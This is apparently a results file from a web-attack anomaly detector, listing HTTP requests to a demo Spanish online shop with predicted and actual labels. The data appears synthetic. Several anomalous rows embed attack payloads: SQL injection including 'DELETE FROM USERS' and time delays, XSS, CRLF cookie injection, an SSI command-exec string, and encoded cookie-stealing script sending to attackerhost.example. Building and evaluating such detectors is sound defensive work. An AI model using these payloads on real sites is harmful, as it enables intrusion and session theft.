Predicted,Actual,Confidence,Method,Content,URL
0,Normal,89.78%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=38&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
0,Normal,81.05%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rehbein&password=paleogr%E1fico&nombre=M%E1ximo&apellidos=Just+Darn%E9s&email=wahl%4021horas.iq&dni=94318165H&direccion=Calle+Del+Mistral%2C+65+&ciudad=C%E0noves+i+Samal%FAs&cp=25727&provincia=Cuenca&ntc=4277353398050908&B1=Registrar HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1,Anomalous,99.29%,POST,modo=registro&login=veen&password=sar*gent%EDa&nombre=Vigilio&apellidos=Mitjavila+Oca&email=g%40anor%40%40goscan%40.uz&dni=29573614F&direccion=Calle+Ripolles+83%2C+&ciudad=Valderr%E1bano&cp=16812&provincia=Valencia&ntc=7619192104254644&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.43%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar%27+DELETE+FROM+USERS HTTP/1.1
1,Anomalous,93.21%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mayi&password=r75ar&nombre=Alenka&apellidosA=Cejas+Torra&email=kobe%40techdata.com.pg&dni=75925253E&direccion=Calle+Casas+Viejas+73+&ciudad=Torres+de+Cotillas%2C+Las&cp=08731&provincia=Navarra&ntc=1803474685764017&B1=Registrar HTTP/1.1
1,Anomalous,99.03%,GET,,http://localhost:8080/tienda1/asf-logo-wide.gif.bak HTTP/1.1
0,Anomalous,89.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=d%2Fmsrtime&pwd=5872ra&remember=off&B1=Entrar HTTP/1.1
0,Anomalous,76.48%,POST,modo=registro&login=chapdela&password=sacar*ificaci%F3n&nombre=Gali&apellidos=Pi%F1eriro+Celayes&email=macgowan%40comerciosdeaspe.kr&dni=47913001E&direccion=C%2F+Virgen+De+La+Esperanza+S%2FN%2C+9-B&ciudad=Espadilla&cp=1664A&provincia=Ciudad+Real&ntc=8410049060666952&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,87.76%,POST,modo=registro&login=lowietje&password=fal429a&nombre=Amelia&apellidos=Masana+Molera&email=guize_ranson%40infotek.bn&dni=69320452Q&direccion=Concejo+De+Alzuza%2C+47%2C+&ciudad=Valdelagua+del+Cerro&cp=42142&provincia=%C1vila&ntc=7953040031397493&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.47%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730.OLD HTTP/1.1
0,Anomalous,75.86%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sienggo&password=6121cu5g%E9*7449&nombre=Jer%F3nimo&apellidos=Carretto+Morgadas&email=magelis.kember%40cirujanaplastica.nc&dni=22646510C&direccion=Plaza+San+Jorge%2C+S%2FN%2C+2%3FH&ciudad=Mariana&cp=15807&provincia=Palencia&ntc=798769257812246A&B1=Registrar HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,99.77%,PUT,modo=registro&login=antonin&password=sUpLiDora&nombre=Calixto&apellidos=Giorgis+Zabala&email=merry%40mcrspain.gg&dni=23625046K&direccion=Pla%E7a+Manuel+Corachan+S%2FN%2C+9A&ciudad=Coscurita&cp=08696&provincia=Lleida&ntc=1573270411029963&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.87%,POST,B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,99.15%,POST,modo=registro&login=carolina&password=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&nombre=Ihor&apellidos=M%FAgica+Vall%E9s&email=urecal8%40espanolynegocios.bu&dni=67961648Y&direccion=Av.+Olimpica%2C+156+&ciudad=Navajas&cp=43941&provincia=Madrid&ntc=2515177122592288&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,94.88%,POST,id=3&nombre=Vino+Rioja&precio=39&cantidad=35&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,95.89%,PUT,id=3&nombre=Queso+Manchego&precio=100&cantidad=84&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1,Normal,62.87%,POST,modo=registro&login=rivalee&password=en7repa2ECERsE&nombre=Natal%ED&apellidos=Els%E4sser+Gula&email=jannings_corrigan%40castigadas.gm&dni=41719663D&direccion=Deimos+147+12%3FA&ciudad=Mont%E1nchez&cp=26540&provincia=%C1vila&ntc=8319713871546470&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.85%,POST,B2=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080.old HTTP/1.1
1,Anomalous,99.04%,POST,B2=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
1,Anomalous,86.04%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=skipp&pwd=bra3o&rememberA=on&B1=Entrar HTTP/1.1
0,Anomalous,89.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=p%2Bap*e&pwd=74oNc0&remember=on&B1=Entrar HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.58%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4350&B1=Confirmar HTTP/1.1
1,Anomalous,99.84%,POST,errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,97.60%,POST,modo=registro&login=waverley&password=sal&nombre=Soledad&apellidos=Cadi%F1anos+Batalla&email=connelly%40librodeapuntes.ae&dni=87996424B&direccion=Algodre+66%2C+&ciudad=Plan&cp=03430&provincia=Navarra&ntc=8615233836935718&B1A=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/SmarTicketApp/index.html HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/asf-logo-wide.Bak HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,94.88%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=35&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,98.40%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,99.54%,POST,modo=registro&login=teena&password=EnraNCiAR&nombre=Julio&apellidos=Guardiol+Sim%F3&email=heuser%40prensahp.mx&dni=31293475C&direccion=Calle+Rejas%2C+23%2C+4%3FB&ciudad=Montiel&cp=08183&provincia=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&ntc=5996994438589439&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.85%,POST,B2=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,98.86%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,67.86%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vera&password=0ip0rbol1id7&nombre=Samay&apellidos=Artells+Arteta&email=henn_others%40lasmilyuna.gi&dni=13605020Z&direccion=Paseo+Alcalde+Rafael+Ginel%2C+121+%253F&ciudad=Fuentelisendo&cp=09219&provincia=Madrid&ntc=6311255681512253&B1=Registrar HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
0,Normal,98.40%,POST,id=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.96%,GET,,http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,99.53%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1
0,Normal,98.40%,POST,id=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.99%,POST,modo=entrarsessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=sabry&pwd=ce8cuate&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,94.88%,POST,id=2&nombre=Queso+Manchego&precio=39&cantidad=73&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
1,Anomalous,98.86%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
1,Anomalous,91.33%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ambrosio&password=T%3Fub0lo6O&nombre=Adonay&apellidos=Castillero+Minguez&email=gamble%40viajesinternacionales.as&dni=73982596Z&direccion=C%2F+Isabel+Fornieles%2C+168+5E&ciudad=Vid+de+Ojeda%2C+La&cp=02639&provincia=%3F&ntc=4663857286858703&B1=Registrar HTTP/1.1
1,Anomalous,99.99%,POST,id=1&nombre=Queso+Manchego&precio=85sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&cantidad=55&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Normal,98.54%,GET,,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=eggebraa&pwd=enALtEceDOr&remember=on&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,98.40%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
1,Anomalous,99.09%,POST,modo=registro&login=sabadash&password=gurullada&nombre=Sergio&apellidos=Dinardi+Compres&email=wences.seigner%40aldufa.es&dni=92012174F&direccion=Valldemosa%2C+129+4H&ciudad=Frumales&cp=19490&provincia=Valencia&ntc=5024784015351535%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,94.88%,POST,id=1&nombre=Vino+Rioja&precio=85&cantidad=39&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Anomalous,57.15%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=millaire&password=pintoja&nombre=Ceciliano&apellidos=Ballest%E9+Carranza&email=wagenhiem_hollingsworth%40eddydaniele.museum&dni=27857756H&direccion=Calle+Luis+Mila+23+10%3FA&ciudad=Guadalupe&cp=09500&provincia=M%E1l..ag.a&ntc=2397290594537988&B1=Registrar HTTP/1.1
1,Anomalous,99.98%,POST,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
1,Anomalous,98.44%,GET,,http://localhost:8080/tienda1/publico/asf-logo-wide.gif/ HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
0,Normal,98.76%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1,Anomalous,97.37%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=98&B1A=A%F1adir+al+carrito HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
0,Normal,83.34%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=36&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,98.53%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morrie%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=ePa&nombre=Erlan&apellidos=Sordo+Alquinta&email=nieva%40menorca.com.sz&dni=22787443D&direccion=Pl.+De+La+Palomera%2C+S%2FN+2%3FD&ciudad=Oss%F3+de+Si%F3&cp=31353&provincia=Badajoz&ntc=5124736256894307&B1=Registrar HTTP/1.1
0,Normal,73.81%,POST,modo=registro&login=orr&password=querando&nombre=Adalgisa&apellidos=T%E1vara+Ganci&email=baz_azais%40filtraciondehumos.sb&dni=47106635J&direccion=Calle+Carme+Karr%2C+65%2C+10A&ciudad=A%F1%F3n+de+Moncayo&cp=46470&provincia=Valencia&ntc=9481894123052720&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
0,Normal,94.05%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=71&B1=A%F1adir+al+carrito HTTP/1.1
0,Normal,98.67%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
1,Anomalous,95.99%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=winnie&password=1ArZ5ElA&nombre=Pomponio&apellidos=Aboitiz+Monestel&email=mcnaughton%40queinvento.gg&dni=86852947W&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Foradada&cp=43411&provincia=Badajoz&ntc=4587587495208642&B1=Registrar HTTP/1.1
0,Normal,89.65%,POST,modo=entrar&login=ryan&pwd=fErrErUelO&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,97.57%,POST,modo=insertar&precio=1477&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
0,Normal,98.77%,GET,,http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1
1,Anomalous,98.29%,GET,,http://localhost:8080/tienda1/miembros/6909030637832563290.jsp HTTP/1.1
1,Anomalous,92.00%,POST,modo=entrar&login=ruoh-chy&pwd=48a4ta4i%F35&rememberA=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
1,Anomalous,99.33%,POST,idA=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
0,Normal,99.23%,GET,,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1
1,Anomalous,62.87%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kui-soon&password=a2rava46e&nombre=Palmira&apellidos=Espasa+Radillo&email=provine%40acchportugal.pm&dni=+&direccion=Pl.+Merced%2C+147+&ciudad=Arag%FC%E9s+del+Puerto&cp=17860&provincia=Valencia&ntc=6653520296014464&B1=Registrar HTTP/1.1
0,Normal,98.56%,GET,,http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1
1,Anomalous,99.16%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cantidad=98&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/webapp/examples/HitCount HTTP/1.1
1,Anomalous,99.85%,POST,errorMsg=Credenciales+incorrectas%3F,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
1,Anomalous,98.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=cadtools&pwd=hirco&remember=on&B1=Entrar HTTP/1.1
1,Anomalous,97.99%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=1&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,98.33%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=342&B1A=Confirmar HTTP/1.1
1,Anomalous,92.80%,POST,modo=registro&login=orin&password=-picardo&nombre=Abdel&apellidos=Butgardon+Nogueola&email=gruber_coonleu2%4013horas.gd&dni=01485962R&direccion=C%2F+Dean+Zaragoza%2C+121%2C+3%3FF&ciudadA=Manzanares+de+Rioja&cp=10320&provincia=Tarragona&ntc=7019128691164371&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,86.64%,POST,modo=insertar&precio=1400%7C&B1=Pasar+por+caja,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,98.46%,GET,,http://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp HTTP/1.1
1,Anomalous,99.23%,GET,,http://localhost:8080/IISSamples/sdk/asp/database/LimitRows_VBScript.asp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
0,Normal,98.78%,GET,,http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
1,Anomalous,99.23%,POST,errorMsgA=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.85%,POST,B2=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,95.75%,POST,modo=entrar&loginA=krowlek&pwd=veintidoseno&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,98.66%,GET,,http://localhost:8080/tienda1/index.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
0,Normal,83.57%,POST,modo=registro&login=shiley&password=TiE3t54&nombre=Yaiti&apellidos=Marcano+Giner&email=marmont_doran%40peliculasen3d.ng&dni=52382768S&direccion=Carretera+Aravaca+a+Carabanchel%2C+194+8-E&ciudad=Berrocal&cp=17732&provincia=Soria&ntc=4787579213279770&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,90.00%,POST,id=2&nombre=Vino+Rioja&precio=85&cantidad=9&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
0,Normal,98.81%,GET,,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
0,Anomalous,72.53%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=*Vila-nova%2C+139+&ciudad=Riudoms&cp=36960&provincia=Burgos&ntc=1343774789684603&B1=Registrar HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,99.03%,GET,,http://localhost:8080/tienda1/asf-logo-wide.java HTTP/1.1
0,Normal,89.65%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=josef&pwd=55z8do&remember=on&B1=Entrar HTTP/1.1
1,Anomalous,99.02%,POST,modo=insertar&precio=2352&B1=Confirmar%2F,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
1,Anomalous,99.56%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lysinger&password=D9SOr9an21a2oR&nombre=Giovana&apellidos=Planelles+Neris&email=measor.barezewska%40enlanzarote.com.gq&dni=54498003D&direccion=C%2F+Fuensanta+41+&ciudad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=32650&provincia=Huesca&ntc=5070328292613697&B1=Registrar HTTP/1.1
0,Normal,97.99%,GET,,http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
1,Anomalous,99.66%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 HTTP/1.1
0,Normal,98.96%,POST,errorMsg=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
0,Normal,97.64%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,66.85%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=halford&password=8L077ra&nombre=C%E9lica&apellidos=Terroba&email=ratcliffe%40921.uk&dni=19782471X&direccion=C%2F+Francisco+De+Ricci+23%2C+1%3FC&ciudad=Villanueva+de+las+Cruces&cp=09339&provincia=Cuenca&ntc=8641505731046514&B1=Registrar HTTP/1.1
1,Anomalous,99.51%,GET,,http://localhost:8080/6909030637832563290.jsp HTTP/1.1
0,Normal,78.55%,POST,modo=registro&login=tandy&password=te%3Fclear&nombre=Saia&apellidos=M%F3nico+Echeverr%EDa&email=jaguin-woodridge%40cristinaleon.si&dni=89372245H&direccion=C%2F+Enrique+Mari%F1as+129+&ciudad=Tolox&cp=37711&provincia=Ja%E9n&ntc=8513667184992896&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
1,Anomalous,72.52%,POST,modo=registro&login=jdavie&password=CoMba82V72Ad&nombre=Ram&apellidos=Pieres+Marrett&email=anutchitcharnchai%40informatica2009.ec&dni=76610505N&direccion=Juan+Martel+18%2C+8%3FH&ciudad=Buenavista+del+Norte&cpA=08612&provincia=Guadalajara&ntc=0010509413049118&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,98.71%,GET,,http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1
